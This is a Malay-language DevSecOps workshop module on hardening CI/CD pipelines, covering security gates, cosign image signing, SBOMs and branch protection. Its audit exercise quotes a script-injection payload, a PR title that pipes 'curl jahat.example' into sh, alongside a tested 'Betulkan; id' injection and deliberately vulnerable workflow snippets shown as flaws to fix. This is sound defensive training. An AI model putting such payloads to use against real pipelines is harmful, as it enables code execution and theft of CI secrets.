# Modul 6: CI/CD dan supply chain

**Hari 4, 9:00 pagi hingga 1:00 petang**

Dalam modul ini anda akan:

1. Faham kenapa **pipeline itu sendiri** ialah sasaran, dan kawalan asas untuk mengerasnya.
2. Membina pipeline dengan quality gate: secret, SAST, SCA, IaC, binaan imej, imbasan imej dan tolak ke Harbor. Pilih **GitHub Actions** atau **GitLab CI**; kedua-duanya diterangkan.
3. Menjana **SBOM**, menandatangani imej dengan **cosign**, dan mengesahkan tandatangan.
4. Menguji bahawa pintu **benar-benar menggagalkan** pipeline bila ada masalah.

> **Pilih platform anda** dalam menu kiri, di bawah **Platform CI (Modul 6)**. Bahagian bertanda "Platform: GitHub Actions" atau "Platform: GitLab CI" hanya dipaparkan untuk pilihan anda. Bahagian tanpa tanda terpakai untuk kedua-duanya.

> Prasyarat: Modul 1 hingga 5 siap, robot account Harbor `ci` daripada [Modul 4](../modul-4-container-iac/README.md#makmal-4-6-robot-account-untuk-ci), dan imej `:selamat` anda sudah ada di Harbor. Untuk GitHub: akaun GitHub. Untuk GitLab: projek di GitLab yang diberi instruktur, dengan runner jenis Docker.

## Jadual

| Masa | Aktiviti |
|---|---|
| 9:00 – 9:40 | Teori: pipeline sebagai sasaran, supply chain, penandatanganan |
| 9:40 – 10:30 | Makmal 6.1 dan 6.2: sediakan repo dan pembolehubah, cosign setempat |
| 10:30 – 10:45 | Rehat |
| 10:45 – 12:00 | Makmal 6.3: jalankan pipeline |
| 12:00 – 12:35 | Makmal 6.4: kerasnya pipeline |
| 12:35 – 1:00 | Makmal 6.5: uji pintu dan semakan |

---

## Teori ringkas

### Pipeline sebagai sasaran

Pipeline CI/CD memegang **kunci kerajaan**: ia boleh membaca kod, memegang secret, menolak imej dan menyentuh produksi. Penyerang yang menguasai pipeline menguasai semua itu tanpa menyentuh app.

<div class="ci ci-gh" markdown="1">

| Ancaman | Contoh | Kawalan |
|---|---|---|
| Action pihak ketiga dikompromi | Action popular diubah untuk mencuri secret | **Sematkan action pada SHA commit**; kurangkan jumlah action pihak ketiga |
| `GITHUB_TOKEN` terlalu berkuasa | Token boleh menulis ke repo untuk semua job | `permissions:` minimum, **`contents: read`** |
| Secret bocor | Secret dicetak dalam log; dibaca oleh PR daripada fork | Secret hanya untuk job `push`, bukan `pull_request`; hantar melalui `env:` |
| Suntikan skrip | `run: echo ${{ github.event.pull_request.title }}` | Jangan interpolasi input tidak dipercayai dalam `run:`; guna `env:` |
| Tiada semakan pada cawangan utama | Sesiapa boleh menolak terus ke `main` | **Branch protection**: PR wajib, status check wajib, `CODEOWNERS` |
| Imej atau artifak diganti | Imej di registry diubah selepas dibina | **Tandatangan** imej; sahkan di admission (Modul 7) |
| Pakej palsu atau lapuk | Slopsquatting (Modul 3) | Fail kunci, SCA, SBOM |

</div>

<div class="ci ci-gl" markdown="1">

| Ancaman | Contoh | Kawalan |
|---|---|---|
| Imej job pihak ketiga dikompromi | Tag `image:` ditunjuk semula ke imej yang dirosakkan | Guna **versi tepat** (dan digest untuk komponen kritikal); guna imej yang anda uji sendiri |
| Token job terlalu berkuasa | `CI_JOB_TOKEN` boleh mencapai projek lain | Hadkan projek yang dibenarkan menggunakan token job (tetapan token job dalam Settings → CI/CD) |
| Secret bocor | Pembolehubah dicetak dalam log; dibaca oleh pipeline cawangan yang tidak dipercayai | Tandakan pembolehubah **Masked** dan **Protected** (hanya cawangan dilindungi menerimanya); job yang memegang secret hanya pada cawangan lalai |
| Suntikan skrip | `sh -c "echo $CI_MERGE_REQUEST_TITLE"` | Jangan hantar pembolehubah tidak dipercayai ke `sh -c` atau `eval`; rujuk sebagai `"$VAR"` yang dipetik |
| Tiada semakan pada cawangan utama | Sesiapa boleh menolak terus ke `main` | **Protected branch** (tiada sesiapa boleh push), **Pipelines must succeed** sebelum gabung |
| Imej atau artifak diganti | Imej di registry diubah selepas dibina | **Tandatangan** imej; sahkan di admission (Modul 7) |
| Pakej palsu atau lapuk | Slopsquatting (Modul 3) | Fail kunci, SCA, SBOM |

</div>

### Penjelajah pipeline

Klik setiap peringkat untuk melihat alat, arahan, syarat gagal dan masa yang kami ukur untuk app lab:

<div data-widget="pipeline"></div>

### Supply chain dan tandatangan

<div data-fig="rantaian-bekalan"></div>

**SBOM** (Modul 3) menyenaraikan apa yang ada dalam imej. **Tandatangan** membuktikan **siapa** yang membinanya dan bahawa ia tidak diubah. Gabungan kedua-duanya menjawab: *"adakah imej ini yang kita bina, dan apa yang ada di dalamnya?"*

**cosign** menandatangani imej OCI dan menyimpan tandatangan di registry yang sama. Ada dua cara:

- **Berasaskan kunci** (kita guna): anda ada pasangan kunci; kunci peribadi menandatangani, kunci awam mengesahkan. Mudah, tetapi anda mengurus kunci peribadi dengan selamat.
- **Tanpa kunci (keyless)**: tandatangan menggunakan identiti OIDC (cth GitHub Actions atau GitLab CI) dan log ketelusan awam Sigstore. Tiada kunci jangka panjang untuk dicuri, tetapi memerlukan akses ke perkhidmatan Sigstore dan rekod awam. Sesuai untuk produksi tetapi di luar skop makmal ini.

**SLSA** ialah rangka kerja yang menilai kematangan supply chain (siapa membina, bagaimana, dengan bukti apa). Apa yang kita bina hari ini ialah langkah awal ke arah itu.

---

## Makmal 6.1: Sediakan repo dan pembolehubah

**Tujuan.** Menghantar repo lab anda ke platform CI dengan fail yang diperlukan pipeline.

Pertama, pastikan fail yang pipeline perlukan dalam git, dan fail yang tidak patut masuk, diabaikan:

```bash
cat >> .gitignore <<'EOF'
zap-hasil/
*.sarif
sbom*.json
cosign.key
EOF
git add .gitignore gitleaks-baseline.json .trivyignore 2>/dev/null
git status --short
```

`gitleaks-baseline.json` (Modul 1) dan `.trivyignore` (Modul 3, Trek A) perlu ada dalam repo supaya pipeline menggunakannya. **`cosign.key` tidak boleh masuk git**: ia kunci peribadi anda.

<div class="ci ci-gh" markdown="1">

Cipta repo baharu di GitHub (UI: **New repository**, jangan tambah README). Kemudian, dari folder repo:

```bash
git add -A
git commit -m "Pembaikan keselamatan Modul 1 hingga 5"
git remote rename origin upstream 2>/dev/null   # origin lama menunjuk ke repo instruktur (baca sahaja)
git remote add origin https://github.com/NAMA_ANDA/devsecops-lab.git
git push -u origin main
```

> **Jika GitHub menyekat push** kerana mengesan secret (push protection), baca mesej itu: ia menunjuk fail dan baris. Semua secret dalam repo ini palsu dan direka supaya tidak menyerupai format token sebenar, jadi ini sepatutnya tidak berlaku; jika ia berlaku, jangan bypass tanpa membaca apa yang ditemui.

Dalam GitHub: **Settings → Secrets and variables → Actions**. Tambah:

| Jenis | Nama | Nilai |
|---|---|---|
| Variable | `APP_DIR` | `aspnet-app` atau `laravel-app` |
| Variable | `HARBOR_USER` | `robot$pesertaNN+ci` |
| Variable | `HARBOR_PROJECT` | `pesertaNN` |
| Secret | `HARBOR_PASSWORD` | rahsia robot (Modul 4.6) |
| Secret | `HARBOR_CA` | seluruh kandungan `ca.crt` |
| Secret | `COSIGN_PRIVATE_KEY` | kandungan `cosign.key` (dari Makmal 6.2) |
| Secret | `COSIGN_PASSWORD` | kata laluan kunci cosign |

</div>

<div class="ci ci-gl" markdown="1">

Instruktur sudah mencipta projek kosong `pesertaNN/devsecops-lab` untuk anda di `https://gitlab.lab.test:8929` (log masuk sebagai `pesertaNN`, kata laluan daripada instruktur). Dari folder repo:

```bash
git add -A
git commit -m "Pembaikan keselamatan Modul 1 hingga 5"
git remote -v
git push gitlab main
```

`git remote -v` mesti menunjukkan remote `gitlab` (daripada Persediaan 4d). Jika tiada, tambah dahulu: `git remote rename origin upstream` dan `git remote add gitlab https://gitlab.lab.test:8929/pesertaNN/devsecops-lab.git`, kemudian `git push -u gitlab main`. Jangan tolak ke `upstream` atau `origin` yang menunjuk ke GitHub instruktur: ia memberi `Invalid username or token`. Git meminta nama pengguna dan kata laluan GitLab anda. Jika `git` memberi ralat sijil (`SSL certificate problem`), CA lab belum dipercayai dalam terminal Ubuntu: ulang Persediaan 4b.

Dalam GitLab: **Settings → CI/CD → Variables**. Tambah satu demi satu:

| Nama | Nilai | Jenis dan bendera |
|---|---|---|
| `APP_DIR` | `aspnet-app` atau `laravel-app` | Variable |
| `HARBOR_USER` | `robot$pesertaNN+ci` | Variable; **nyahpilih "Expand variable reference"** (lihat amaran di bawah) |
| `HARBOR_PROJECT` | `pesertaNN` | Variable |
| `HARBOR_PASSWORD` | rahsia robot (Modul 4.6) | Variable; **Masked**, **Protected** |
| `HARBOR_CA` | seluruh kandungan `ca.crt` | **File** |
| `COSIGN_PRIVATE_KEY` | kandungan `cosign.key` (dari Makmal 6.2) | **File**; **Protected** |
| `COSIGN_PASSWORD` | kata laluan kunci cosign | Variable; **Masked**, **Protected** |

> **Amaran: GitLab mengembangkan `$` dalam nilai pembolehubah.** `robot$pesertaNN+ci` dibaca sebagai `robot` + pembolehubah `pesertaNN` (kosong) + `+ci`, jadi `docker login` gagal dengan `unauthorized`. Nyahpilih **Expand variable reference** pada `HARBOR_USER` (dalam API, `raw=true`).
>
> **Protected** bermakna pembolehubah hanya diberi kepada pipeline pada cawangan atau tag yang dilindungi. Pastikan `main` ialah cawangan dilindungi (Settings → Repository → Protected branches); pipeline pada cawangan lain, termasuk merge request daripada cawangan biasa, tidak akan menerima secret ini. Itulah yang kita mahu.

**Runner.** Pipeline ini memerlukan runner jenis Docker yang boleh mencapai `harbor.lab.test` dan memasang soket Docker (`/var/run/docker.sock`) supaya job `imej` boleh membina imej. Instruktur sudah menyediakan satu runner untuk semua projek (runner peringkat instance, tiga job serentak). Dengan sepuluh peserta, job anda mungkin menunggu giliran beberapa minit apabila ramai menolak serentak: tunggu, jangan tolak berulang kali. Soket Docker memberi job kuasa penuh ke atas Docker hos, jadi susunan ini wajar untuk makmal sahaja; Makmal 6.4 membincangkannya.

</div>

---

## Makmal 6.2: cosign: tandatangan dan sahkan secara setempat

**Tujuan.** Faham tandatangan sebelum mengautomasikannya.

Pasang cosign (versi dikunci, disahkan dengan checksum):

```bash
curl -fsSL -o cosign https://github.com/sigstore/cosign/releases/download/v3.1.4/cosign-linux-amd64
echo "424e2c97d0b45fd7a6b608a87f090f35633f4c23ece5f092d48bba11aaf4bbfa  cosign" | sha256sum -c -
sudo install -m 0755 cosign /usr/local/bin/cosign
cosign version | grep GitVersion
```

> Jika muat turun daripada GitHub gagal (kami pernah melihat ralat 504 pada fail release), ambil binari yang sama daripada imej cosign, yang dikunci pada digest. Ini juga cara pipeline GitLab dalam Makmal 6.3 mendapatkan cosign:
>
> ```bash
> C=$(docker create ghcr.io/sigstore/cosign/cosign@sha256:0f06154836d2de34f887a5c273506d52ca43edaa1d9e53e6510fa78a48f69c2d)
> docker cp "$C:/ko-app/cosign" ./cosign && docker rm "$C"
> sudo install -m 0755 cosign /usr/local/bin/cosign
> ```
>
> Binari ini bukan salinan bait-ke-bait fail release (checksumnya berbeza) tetapi versi yang sama, `v3.1.4`.

Jana pasangan kunci (kata laluan kunci disimpan dalam pemboleh ubah untuk sesi ini; guna kata laluan anda sendiri):

```bash
export COSIGN_PASSWORD='kata-laluan-kunci-anda'
cosign generate-key-pair
ls cosign.key cosign.pub
```

> Jika anda akan menggunakan GitLab dan menandakan `COSIGN_PASSWORD` sebagai **Masked**, kata laluan mesti sekurang-kurangnya 8 aksara tanpa aksara khas yang GitLab tidak benarkan dalam nilai bertopeng (huruf dan nombor sahaja ialah paling selamat).

Tandatangani imej anda di Harbor. Tandatangan dibuat pada **digest** (kandungan tepat), bukan tag:

<div class="trk trk-a" markdown="1">

```bash
P=peserta03   # nombor anda
IMG=harbor.lab.test/$P/aspnet-app:selamat
```

</div>

<div class="trk trk-b" markdown="1">

```bash
P=peserta03   # nombor anda
IMG=harbor.lab.test/$P/laravel-app:selamat
```

</div>

```bash
D=$(docker buildx imagetools inspect --format '{{.Manifest.Digest}}' $IMG)
REF=${IMG%:*}@$D
echo $REF
cosign sign --key cosign.key --yes --new-bundle-format=false --use-signing-config=false $REF
cosign verify --key cosign.pub $REF | head -c 300; echo
```

> **Tunggu imbasan Harbor selesai sebelum mengakses imej.** Dengan polisi pencegahan dihidupkan, Harbor menyekat capaian ke imej yang belum diimbas (HTTP 412) sehingga imbasan selesai. Jika `imagetools inspect` atau `cosign sign` gagal dengan 412, tunggu beberapa saat dan ulang. Pipeline dalam Makmal 6.3 menunggu secara automatik.

> Bendera `--new-bundle-format=false --use-signing-config=false` memilih format tandatangan lama (tag `.sig`) yang boleh disahkan oleh Kyverno 1.19 dalam Modul 7.

Kini uji **imej tanpa tandatangan**. Tandatangan melekat pada **digest**, jadi cipta imej yang **berbeza** (tambah satu label), tolak, dan cuba sahkan:

<div class="trk trk-a" markdown="1">

```bash
APP=aspnet-app
```

</div>

<div class="trk trk-b" markdown="1">

```bash
APP=laravel-app
```

</div>

```bash
printf 'FROM %s\nLABEL ujian=belum-sah\n' "$IMG" | docker buildx build --provenance=false --sbom=false --load -t harbor.lab.test/$P/$APP:belum-sah -
docker push harbor.lab.test/$P/$APP:belum-sah
sleep 20   # tunggu imbasan Harbor selesai
D2=$(docker buildx imagetools inspect --format '{{.Manifest.Digest}}' harbor.lab.test/$P/$APP:belum-sah)
cosign verify --key cosign.pub harbor.lab.test/$P/$APP@$D2; echo "exit=$?"
```

Lampirkan **SBOM** sebagai attestation dan sahkannya:

```bash
trivy image --quiet --format cyclonedx --output sbom.cdx.json $IMG
cosign attest --key cosign.key --type cyclonedx --predicate sbom.cdx.json --yes $REF
cosign verify-attestation --key cosign.pub --type cyclonedx $REF > /dev/null && echo "attestation sah"
cosign tree $REF
```

`cosign tree` menunjukkan bukti yang melekat pada imej: tandatangan dan SBOM.

<details>
<summary>Jawapan: apa yang berlaku?</summary>

`cosign sign` menolak satu artifak tandatangan ke Harbor (dalam repositori yang sama), `cosign verify` mengesahkannya dengan kunci awam dan memulangkan `exit 0`. Untuk imej dengan digest berbeza yang tidak ditandatangani, `cosign verify` memulangkan `no signatures found` dan exit tidak sifar: ini yang akan digunakan oleh pintu admission dalam Modul 7. `cosign tree` memaparkan dua artifak yang melekat: tandatangan dan SBOM CycloneDX.
</details>

---

## Makmal 6.3: Jalankan pipeline

**Tujuan.** Mengautomasikan semua yang anda lakukan secara manual.

<div class="ci ci-gh" markdown="1">

Simpan `keselamatan.yml` (bahagian **Fail modul**) sebagai `.github/workflows/keselamatan.yml`:

```bash
mkdir -p .github/workflows
# salin kandungan keselamatan.yml ke .github/workflows/keselamatan.yml
git add .github && git commit -m "Tambah pipeline keselamatan" && git push
```

Buka tab **Actions** di GitHub dan ikuti larian. Baca fail itu sambil menunggu. Dua job:

- **`imbas`**: Gitleaks (sejarah, dengan baseline), Semgrep (`--severity ERROR --error`), Trivy fs (SCA) dan Trivy config (Dockerfile, `k8s/`, `terraform/`), semuanya sebagai pintu. Berjalan pada **push dan PR**.
- **`imej`**: bina, imbas imej (gagal jika ada Critical), jana SBOM, tolak ke Harbor, **tunggu imbasan Harbor**, pasang cosign, tandatangani dan lampirkan SBOM. Berjalan pada **push sahaja** kerana ia memerlukan secret.

Soalan:

1. Kenapa job `imej` tidak berjalan pada pull request?
2. Kenapa tiada action pihak ketiga selain `actions/checkout`?
3. Apa gunanya langkah "Tunggu imbasan Harbor selesai"?

<details>
<summary>Jawapan</summary>

1. Pull request (terutama daripada fork) tidak patut mendapat secret. Job yang memegang secret dan menolak imej hanya berjalan selepas kod digabung ke `main`.
2. Setiap action pihak ketiga ialah kod luar yang berjalan dalam pipeline anda. Menggunakan imej Docker dengan versi dikunci (yang sama seperti `alat.sh`) mengurangkan permukaan itu dan memberi hasil yang sama seperti yang anda uji secara setempat. `actions/checkout` pula disematkan pada **SHA commit** bukan tag.
3. Dengan polisi pencegahan Harbor, imej yang belum selesai diimbas disekat (412). Tanpa menunggu, `cosign sign` yang mengakses imej itu boleh gagal secara rawak.
</details>

</div>

<div class="ci ci-gl" markdown="1">

Simpan `gitlab-ci.yml` (bahagian **Fail modul**) sebagai `.gitlab-ci.yml` di akar repo, dan tolak. Fail ini **menggantikan** fail ringkas dengan satu job `sast` yang anda cipta dalam Makmal 2.8: job `sast` yang sama kini bersama tiga job imbasan lain dan job `imej`, dan pengecualian `--exclude Dockerfile` dibuang kerana Dockerfile sudah dibaiki dalam Modul 4.

```bash
cp gitlab-ci.yml .gitlab-ci.yml   # atau simpan terus dengan nama itu
git add .gitlab-ci.yml && git commit -m "Tambah pipeline keselamatan" && git push
```

Buka **Build → Pipelines** di GitLab dan ikuti larian. Baca fail itu sambil menunggu. Dua peringkat:

- **`imbas`**: empat job **selari**, setiap satu dalam imej alat dengan versi dikunci: `secret-detection` (Gitleaks, sejarah, dengan baseline), `sast` (Semgrep, `--severity ERROR --error`), `sca` (Trivy fs) dan `iac` (Trivy config untuk Dockerfile, `k8s/`, `terraform/`). Semuanya pintu. Berjalan pada **merge request dan pada `main`**.
- **`imej`**: bina, imbas imej (gagal jika ada Critical), jana SBOM, tolak ke Harbor, **tunggu imbasan Harbor**, ambil cosign, tandatangani dan lampirkan SBOM. Berjalan pada **`main` sahaja**, selepas semua job `imbas` lulus.

Soalan:

1. Kenapa job `imej` tidak berjalan pada merge request?
2. Kenapa kita tidak menggunakan templat siap pakai GitLab (`include: template: Security/SAST.gitlab-ci.yml`)?
3. Dalam job `imej`, kenapa SBOM ditulis dengan `> sbom.cdx.json` dan bukan `--output` dengan `-v "$PWD":/work`?

<details>
<summary>Jawapan</summary>

1. Merge request tidak patut mendapat secret. Pembolehubah `HARBOR_PASSWORD` dan kunci cosign ditandakan **Protected**, jadi hanya pipeline pada cawangan dilindungi (`main`) menerimanya; `rules:` pada job `imej` juga menghadkannya kepada cawangan lalai.
2. Templat bawaan menjalankan alat yang dipilih GitLab, dengan versi yang dipilihnya, dan paparan laporan keselamatan penuh (papan pemuka, widget MR) bergantung pada peringkat langganan. Dengan job biasa, hasil sama seperti yang anda uji secara setempat, kod keluar menjadi pintu, dan ia berfungsi pada semua peringkat.
3. Job menggunakan soket Docker hos. Apabila job menjalankan `docker run -v "$PWD":/work`, Docker hos memasang folder `$PWD` pada **hos**, bukan folder dalam kontena job, jadi fail output tidak pernah muncul dalam job. Output ke stdout ditangkap oleh job itu sendiri.
</details>

</div>

### Jika pintu gagal pada kod anda

Ini normal dan sebahagian daripada pelajaran. Baca log dan baiki. Dua sebab biasa:

<div class="trk trk-a" markdown="1">

**Semgrep** menanda dua temuan ERROR yang tinggal selepas pembaikan: `SCS0001` pada `Process.Start` (kod sudah selamat, tetapi peraturan menanda penggunaannya) dan `SCS0002` pada `Db.Exec` (SQL benih tetap). Terima kedua-duanya **dengan alasan** seperti dalam Modul 2.7:

```csharp
// nosemgrep: gitlab.security_code_scan.SCS0001-1 -- hos disahkan dengan regex, hujah dihantar sebagai senarai
using var p = Process.Start(psi)!;
```

```csharp
// nosemgrep: gitlab.security_code_scan.SCS0002-1 -- SQL benih data tetap, tiada input pengguna
using var cmd = new SqliteCommand(sql, conn);
```

(Letakkan komen di baris sebelum kod yang ditanda, dalam `Program.cs`.)

</div>

<div class="trk trk-b" markdown="1">

**Semgrep** menanda MD5 (`weak-crypto`, tiga lokasi) dan `exec-use` (`shell_exec`). MD5 untuk kata laluan ialah vulnerability **sebenar**: jangan tutup dengan `nosemgrep`. Terapkan tampalan bcrypt yang disediakan (`laravel-hash.patch`, **Fail modul**), ia menggantikan MD5 dengan `password_hash`/`password_verify` dalam seeder dan log masuk:

```bash
git apply --check laravel-hash.patch && git apply laravel-hash.patch
```

Tampalan ini mengandaikan tampalan SAST dan DAST (Modul 2 dan 5) sudah diterapkan. Untuk `exec-use`, kod sudah selamat (`escapeshellarg` dan regex), jadi terima dengan alasan:

```php
// nosemgrep: php.lang.security.exec-use.exec-use -- hos disahkan dengan regex dan escapeshellarg
$output = shell_exec('ping -c 1 ' . escapeshellarg($host) . ' 2>&1');
```

</div>

**Trivy** boleh gagal kerana pengecualian (`.trivyignore`) belum dalam repo, atau manifest `k8s/` masih asal: pembaikannya ada dalam Modul 7. Pipeline akan lulus sepenuhnya selepas Modul 7.

> **Harbor dan Trivy CLI boleh berbeza pendapat.** Pintu `imej` kita gagal pada **Critical** (Trivy CLI), manakala polisi Harbor menyekat capaian pada **High** (pengimbas Trivy dalam Harbor, versi dan pangkalan data vulnerabilitynya sendiri). Imej yang bersih mengikut CLI boleh disekat oleh Harbor dengan HTTP 412 pada langkah tandatangan. Itu bukan pepijat pipeline: dua alat, dua pangkalan data. Baiki vulnerability yang Harbor tunjuk, atau (untuk vulnerability tanpa pembaikan) gunakan allowlist projek dengan tarikh tamat.

---

## Makmal 6.4: Kerasnya pipeline

**Tujuan.** Membaca dan memperbaiki pipeline dari sudut keselamatan.

<div class="ci ci-gh" markdown="1">

**Audit.** Dalam `keselamatan.yml`, cari bukti bagi setiap kawalan ini dan tulis nombor barisnya:

1. `GITHUB_TOKEN` berkebenaran minimum.
2. Action disematkan pada SHA.
3. `persist-credentials: false` pada checkout.
4. Secret dihantar melalui `env:`, bukan diselit dalam `run:`.
5. `timeout-minutes` pada setiap job.
6. cosign dimuat turun dengan **checksum**.

**Cari kecacatan.** Penyelenggara baharu menambah langkah ini. Apa yang salah?

```yaml
- name: Sapa pengarang PR
  run: echo "Terima kasih ${{ github.event.pull_request.title }}"
```

<details>
<summary>Jawapan</summary>

Barisan 1 hingga 5 hampir di bahagian atas dan dalam setiap job. Kawalan 6 ialah langkah "Pasang cosign" dengan `sha256sum -c`.

Langkah baharu itu ialah **suntikan skrip**: `${{ ... }}` diganti **sebelum** shell berjalan, jadi tajuk PR seperti `"; curl jahat.example | sh; "` akan dijalankan sebagai arahan. Pembaikan: hantar melalui `env:` dan rujuk sebagai pemboleh ubah shell yang dipetik:

```yaml
- name: Sapa pengarang PR
  env:
    TAJUK: ${{ github.event.pull_request.title }}
  run: echo "Terima kasih $TAJUK"
```
</details>

**Branch protection.** Dalam GitHub: **Settings → Branches → Add rule** untuk `main`. Hidupkan: *Require a pull request before merging*, *Require status checks to pass* (pilih `imbas`) dan *Require review from Code Owners*. Cipta fail `.github/CODEOWNERS` dengan baris `* @NAMA_ANDA`.

Selepas ini tiada sesiapa (termasuk anda) boleh menolak terus ke `main`; semua perubahan melalui PR yang lulus `imbas`.

</div>

<div class="ci ci-gl" markdown="1">

**Audit.** Dalam `.gitlab-ci.yml`, cari bukti bagi setiap kawalan ini dan tulis nombor barisnya:

1. Setiap `image:` menggunakan versi tepat, bukan `latest`.
2. `default: timeout` ditetapkan.
3. Tiada secret dalam fail; semuanya pembolehubah projek (Masked dan Protected).
4. `workflow: rules` menghadkan pipeline kepada merge request dan cawangan lalai.
5. Job `imej` (yang memegang secret) hanya pada cawangan lalai.
6. cosign diambil daripada imej yang dikunci pada **digest**.

**Cari kecacatan.** Penyelenggara baharu menambah langkah ini pada pipeline merge request. Apa yang salah?

```yaml
sapa:
  script:
    - sh -c "echo Terima kasih $CI_MERGE_REQUEST_TITLE"
```

<details>
<summary>Jawapan</summary>

Barisan 1 hingga 6 ada di sepanjang fail: versi imej dalam `image:`, `default: timeout`, `workflow: rules`, `rules:` pada `imej`, dan `COSIGN_IMAGE` yang berdigest.

Langkah baharu itu ialah **suntikan skrip**. Shell luar menggantikan `$CI_MERGE_REQUEST_TITLE` ke dalam rentetan yang dihantar kepada `sh -c`, dan shell dalam kemudian **mentafsirnya sebagai arahan**. Kami menguji ini: merge request bertajuk `Betulkan; id` menjalankan `id` dalam job (`uid=0(root)`), manakala `echo "Terima kasih $CI_MERGE_REQUEST_TITLE"` (tanpa `sh -c`) hanya mencetak tajuk itu sebagai teks. Pembaikan: jangan guna `sh -c` atau `eval` dengan pembolehubah yang dikawal penyerang; rujuk sebagai `"$VAR"` yang dipetik terus dalam `script`.

```yaml
sapa:
  script:
    - echo "Terima kasih $CI_MERGE_REQUEST_TITLE"
```
</details>

**Secret dilindungi.** Kami juga menguji bahawa pembolehubah **Protected** tidak diberi kepada pipeline merge request daripada cawangan biasa: job yang mencetak `${RAHSIA_UJI:-kosong}` mencetak `kosong`. Itulah sebab `HARBOR_PASSWORD` dan kunci cosign anda dilindungi.

**Soket Docker.** Runner makmal memasang `/var/run/docker.sock` dalam setiap job. Soalan: apa yang boleh dilakukan oleh seorang yang boleh mengubah `.gitlab-ci.yml` pada runner itu?

<details>
<summary>Jawapan</summary>

Soket Docker memberi akses kepada daemon Docker hos. Sesiapa yang boleh mengubah pipeline boleh menjalankan kontena sebarangan pada hos (termasuk memasang `/` hos), membaca secret job lain, dan menghentikan atau mengganggu runner. Dalam produksi, gunakan runner tanpa soket dikongsi (cth `kaniko`/`buildah`, atau runner berasingan dan sementara untuk job binaan), dan hadkan siapa yang boleh mengubah pipeline pada cawangan dilindungi.
</details>

**Perlindungan cawangan.** Dalam GitLab:

1. **Settings → Repository → Protected branches**: untuk `main`, tetapkan **Allowed to push and merge** → *Maintainers* bagi gabung dan **No one** bagi push. Kami menguji bahawa `git push` terus ke `main` kemudian ditolak: `You are not allowed to push code to protected branches on this project`.
2. **Settings → Merge requests**: hidupkan **Pipelines must succeed**.

Selepas ini semua perubahan ke `main` melalui merge request, dan merge request itu hanya boleh digabung bila pipeline `imbas` lulus. Penguatkuasaan `CODEOWNERS` (kelulusan wajib daripada pemilik kod) ialah ciri GitLab peringkat berbayar (Premium); semak peringkat GitLab anda sebelum bergantung padanya.

</div>

---

## Makmal 6.5: Uji pintu

**Tujuan.** Pastikan pintu **benar-benar** menggagalkan pipeline.

1. Cipta cawangan dan tambah secret palsu:

   ```bash
   git switch -c uji-pintu
   echo 'api_key = "Zq8w3kLm2Pv9Xb7Nc4Rt6Yh1"' > "$APP_DIR/rahsia.txt"
   ```

   Gantikan `$APP_DIR` dengan `aspnet-app` atau `laravel-app`. Commit (pre-commit hook Modul 1 akan menyekatnya; guna `--no-verify` untuk ujian ini), dan tolak cawangan itu.
2. Buka *pull request* (GitHub) atau *merge request* (GitLab) ke `main`. Lihat langkah/job Gitleaks (`secret-detection`): ia mesti **merah**.
3. Buang fail itu dalam commit baharu, tolak semula. **Adakah ia hijau?** Cuba dan perhatikan.
4. Buang commit yang mengandungi secret daripada **sejarah** cawangan, dan tolak dengan paksa:

   ```bash
   git reset --hard HEAD~2          # buang commit "buang" dan commit "tambah"
   git push --force-with-lease
   ```

   Kini pintu mesti hijau.

<details>
<summary>Jawapan: kenapa langkah 3 masih merah?</summary>

Gitleaks mengimbas **sejarah** git (`gitleaks git`), bukan hanya fail semasa. Commit yang menambah secret masih ada dalam sejarah cawangan walaupun commit seterusnya membuang failnya, jadi pintu terus merah. Inilah sebabnya Modul 1 menekankan bahawa secret yang pernah di-commit mesti dianggap **bocor** dan **diputar** (rotate), bukan sekadar dibuang. Langkah 4 menulis semula sejarah cawangan ujian ini sahaja; pada cawangan yang dikongsi (atau selepas secret sampai ke `main`), cara yang betul ialah putar secret, kemudian tambah temuan itu ke baseline dengan alasan.

<div class="ci ci-gl" markdown="1">

**Nota GitLab.** Job `secret-detection` menggunakan `GIT_STRATEGY: clone`. Kami mendapati bahawa runner yang menggunakan semula folder kerja menyimpan rujukan lama (`refs/pipelines/*`) ke commit yang sudah anda buang dengan paksa, dan Gitleaks mengimbas semua rujukan, jadi pintu kekal merah walaupun cawangan anda sudah bersih. Clone baharu setiap kali menghapuskan kesan itu: dalam ujian kami, pintu menjadi hijau selepas langkah 4 hanya dengan tetapan ini. Pada GitHub Actions, runner yang dihoskan bermula bersih setiap kali.

</div>
</details>

Itu pasti memberi anda bukti bahawa pintu berfungsi: pintu yang tidak pernah diuji ialah andaian, bukan kawalan.

## Senarai semak Modul 6

- [ ] Repo saya di GitHub atau GitLab dengan pembolehubah dan secret yang diperlukan (di GitLab: `HARBOR_USER` tidak mengembangkan `$`, secret Masked dan Protected)
- [ ] Saya menandatangani dan mengesahkan imej Harbor dengan cosign, dan melihat SBOM dengan `cosign tree`
- [ ] Pipeline berjalan (job `imbas` dan `imej`); saya faham setiap langkah
- [ ] Saya mengenal pasti enam kawalan keselamatan dalam fail pipeline dan membetulkan contoh suntikan skrip
- [ ] Saya menghidupkan perlindungan cawangan `main` (status/pipeline wajib lulus)
- [ ] Saya membuktikan pintu Gitleaks menggagalkan pipeline dengan secret yang ditanam, dan faham kenapa membuang fail sahaja tidak memadai

## Rujukan

- Mengeraskan GitHub Actions: <https://docs.github.com/actions/security-guides/security-hardening-for-github-actions>
- Keselamatan pipeline GitLab: <https://docs.gitlab.com/ci/pipeline_security/>
- Pembolehubah CI/CD GitLab (masked, protected, raw): <https://docs.gitlab.com/ci/variables/>
- cosign: <https://docs.sigstore.dev/>
- SLSA: <https://slsa.dev>
- OWASP CI/CD Security Top 10: <https://owasp.org/www-project-top-10-ci-cd-security-risks/>
